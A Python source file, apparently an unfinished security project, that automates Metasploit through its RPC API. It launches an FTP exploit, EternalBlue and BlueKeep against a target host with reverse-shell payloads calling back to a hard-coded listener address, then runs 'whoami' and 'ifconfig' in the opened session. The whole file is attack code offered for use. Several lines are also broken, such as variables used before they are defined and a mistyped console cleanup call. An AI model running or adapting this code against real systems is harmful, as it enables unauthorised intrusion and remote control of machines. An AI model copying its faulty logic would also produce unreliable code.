# def setExploits(client, m, targetIP, port): #takes results of dirty search, target & port, and client?
#     for x in m: ## for every result in the search?
#         exploit = client.modules.use('exploit', x) # Uses the result of the exploit search
#         exploit.target = 0 # WE NEED TO SPECIFY WHICH TARGET WE ARE TARGETING
#         exploit.targetpayloads() # Need to define the common payloads and what we want - this takes the ones that work
#         payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp') # Sets a payload we would want to use
#         exploit['RHOSTS'] = data.get('targetIP') # Need to obtain targetIP addresss somehow
#         exploit['RPORT'] = port # Need to specify port?


from pymetasploit3.msfrpc import MsfRpcClient
# import socket

# TODO MAKE IT NOT HARD CODED
LHOSTIP = '192.168.1.50'


# Inputs: Exploit, Target, Port

class MetasploitInterface:

    def __init__(self, metasploit_ip, metasploit_port, metasploit_pass, target, exploit):
        self.metasploit_ip = metasploit_ip
        self.metasploit_port = metasploit_port
        self.metasploit_pass = metasploit_pass
        self.target = target
        self.exploit = exploit

    
    def connectMetasploit(self):
        client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        print(f"Client Connected {client}")
        return client

    def exploitFTP(self):
        """ SETS UP THE MSFRPC API CLIENT"""
        # client = MsfRpcClient(self.metasploit_pass, port = self.metasploit_port, server = self.metasploit_ip)
        client = self.connectMetasploit()
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])
        
        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
    
        """ SETS PAYLOAD FOR EXPLOIT & LOCAL HOST ADDRESS???"""
        payload = client.modules.use('payload', 'cmd/unix/reverse')
        
        payload['LHOST'] = LHOSTIP
        # exploit["ForceExploit"] = True
        # exploit["ConnectTimeout"] = 100
        # exploit["DCERPC::ReadTimeout"] = 100
        
        # print(exploit.targetpayloads)
        # print(exploit.execute())
        """ CREATES CONSOLE ID FOR EXECUTION OF EXPLOIT & PRINTS EXPLOIT results"""
        cid = client.consoles.console().cid
        print(client.consoles.console(cid).run_module_with_output(exploit, payload=payload))

        """ CREATES SHELL EXAMPLE & GETS USER ID  NEED FIX FOR SESSION ID VALUE """
        shell = client.sessions.session(cid)
        shell.write('whoami')
        print(f"User Level: {shell.read()}")
        shell.write('ifconfig')
        print(f"Address Properties:\n {shell.read()}")
        client.console.console(cid).destroy
        
        ##print(exploit.targetpayloads())
        
    
    def scanFTP(self):
        """ SETS UP THE MSFRPC API CLIENT"""
        client = self.connectMetasploit()
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target

        cid = client.consoles.console().cid
        print(client.consoles.console(cid).run_module_with_output(exploit))


    def eternalBlue(self):
        client = self.connectMetasploit()
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        exploit = client.modules.use(module, specific_module)
        exploit["RHOSTS"] = self.target
        exploit["CheckModule"] = 'auxiliary/scanner/smb/smb_ms17_010'
        print(exploit.missing_required)
        payload = client.modules.use('payload', 'windows/x64/meterpreter/reverse_tcp')
        payload['LHOST'] = LHOSTIP

        cid = client.consoles.console().cid
        print(client.consoles.console(cid).run_module_with_output(exploit))

        # cid = exploit.execute(payload = 'windows/x64/meterpreter/reverse_tcp')
        # print(cid)

    def rdpScanner(self):
        client = self.connectMetasploit()
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
        # exploit["LHOST"] = LHOSTIP

        cid = client.consoles.console().cid
        print(client.consoles.console(cid).run_module_with_output(exploit))

    def blueKeep(self):
        client = self.connectMetasploit()
        split_string = self.exploit.split('/') ## SPLIT ON / and rejoin accordingly

        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        """ SETS UP EXPLOIT and TARGET"""
        exploit = client.modules.use(module, specific_module)
        module = split_string[0]
        specific_module = "/".join(split_string[1:])

        exploit = client.modules.use(module, specific_module)
        print(exploit.missing_required)
        exploit["RHOSTS"] = self.target
        # exploit["TARGET"] = '7'
        # exploit["LHOST"] = LHOSTIP

        cid = client.consoles.console().cid
        print(client.consoles.console(cid).run_module_with_output(exploit))
   

# Outputs: 